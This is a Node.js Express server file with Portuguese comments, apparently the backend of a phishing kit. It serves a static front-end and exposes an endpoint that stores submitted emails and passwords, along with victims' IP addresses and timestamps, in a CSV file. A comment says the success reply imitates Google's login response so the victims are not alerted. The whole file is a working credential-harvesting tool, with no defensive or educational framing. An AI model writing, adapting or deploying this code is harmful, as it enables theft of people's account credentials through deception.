const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const createCsvWriter = require('csv-writer').createObjectCsvWriter;

const app = express();

// Middleware
app.use(cors());
app.use(express.json());
// Servir arquivos estáticos da pasta front
app.use(express.static(path.join(__dirname, '..', 'front')));

// Caminho do arquivo CSV (usar /tmp na Vercel, senão usar diretório atual)
const CSV_FILE = process.env.VERCEL 
    ? path.join('/tmp', 'credentials.csv')
    : path.join(__dirname, 'credentials.csv');

// Criar arquivo CSV com cabeçalhos se não existir
const csvWriter = createCsvWriter({
    path: CSV_FILE,
    header: [
        { id: 'timestamp', title: 'Timestamp' },
        { id: 'email', title: 'Email' },
        { id: 'password', title: 'Password' },
        { id: 'ip', title: 'IP Address' }
    ],
    append: true
});

// Verificar se o arquivo existe, se não, criar com cabeçalhos
if (!fs.existsSync(CSV_FILE)) {
    csvWriter.writeRecords([]).then(() => {
        console.log('Arquivo CSV criado com sucesso');
    });
}

// Endpoint para receber credenciais
app.post('/api/save-credentials', async (req, res) => {
    try {
        const { email, password } = req.body;
        const timestamp = new Date().toISOString();
        const ip = req.ip || req.connection.remoteAddress || 'Unknown';

        if (!email || !password) {
            return res.status(400).json({ error: 'Email e senha são obrigatórios' });
        }

        // Salvar no CSV
        await csvWriter.writeRecords([{
            timestamp: timestamp,
            email: email,
            password: password,
            ip: ip
        }]);

        console.log(`Credenciais salvas: ${email} - ${new Date().toLocaleString()}`);

        // Retornar sucesso (simular resposta do Google)
        res.json({ 
            success: true,
            message: 'Login realizado com sucesso'
        });

    } catch (error) {
        console.error('Erro ao salvar credenciais:', error);
        res.status(500).json({ error: 'Erro ao processar requisição' });
    }
});

// Endpoint para verificar status (opcional)
app.get('/api/status', (req, res) => {
    res.json({ status: 'online', timestamp: new Date().toISOString() });
});

// Exportar para Vercel serverless
module.exports = app;

// Rodar servidor local se não estiver na Vercel
if (!process.env.VERCEL) {
    const PORT = process.env.PORT || 3000;
    app.listen(PORT, () => {
        console.log(`Servidor rodando em http://localhost:${PORT}`);
        console.log(`Arquivo CSV será salvo em: ${CSV_FILE}`);
    });
}
